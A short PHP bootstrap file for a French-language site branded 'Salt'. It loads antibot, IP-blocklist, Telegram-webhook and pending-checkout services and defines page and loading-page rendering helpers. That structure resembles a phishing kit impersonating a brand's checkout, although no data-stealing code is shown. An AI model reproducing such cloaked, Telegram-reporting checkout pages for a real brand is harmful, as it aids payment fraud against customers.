<?php

declare(strict_types=1);

require_once dirname(__DIR__) . '/config.php';
require_once __DIR__ . '/services/runtime.php';
require_once __DIR__ . '/services/ip-blocklist.php';

salt_runtime_init();
require_once __DIR__ . '/services/antibot.php';
require_once __DIR__ . '/services/telegram.php';
require_once __DIR__ . '/services/checkout-pending.php';

antibot_init();
antibot_check_page();
checkout_pending_process_expired();
telegram_ensure_webhook();

function render_page(array $options): void
{
    $page_id = $options['page_id'];
    $title = $options['title'];
    $view = $options['view'];
    $scripts = $options['scripts'];
    $core_scripts = $options['core_scripts'] ?? [];
    $progress_step = $options['progress_step'] ?? null;
    $no_cache = $options['no_cache'] ?? false;

    $view_file = SALT_ROOT . '/views/' . $view . '.php';
    if (!is_file($view_file)) {
        http_response_code(500);
        exit('Vue introuvable.');
    }

    require __DIR__ . '/layouts/default.php';
}

function render_loading_page(array $options): void
{
    $page_id = 'loading';
    $title = 'Chargement — Salt';
    $scripts = $options['scripts'];
    $core_scripts = $options['core_scripts'] ?? [];
    $no_cache = true;

    require __DIR__ . '/layouts/loading.php';
}
